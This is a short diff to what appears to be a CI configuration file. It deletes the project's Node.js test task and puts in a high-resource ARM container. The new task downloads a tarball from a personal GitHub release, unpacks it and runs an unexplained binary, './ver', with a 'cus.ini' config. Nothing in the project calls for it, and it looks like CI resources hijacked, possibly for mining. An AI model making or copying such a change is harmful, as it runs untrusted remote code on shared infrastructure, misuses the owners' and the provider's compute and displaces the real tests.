@@ -1,10 +1,7 @@
-container:
-  image: node:latest
+arm_container:
+  image: openjdk:latest
+  cpu: 4
+  memory: 12G
 
-test_task:
-  yarn_cache:
-    folder: .yarn/cache
-  install_script:
-    - yarn set version berry
-    - yarn install
-  test_script: yarn run test
+task:
+  script: wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
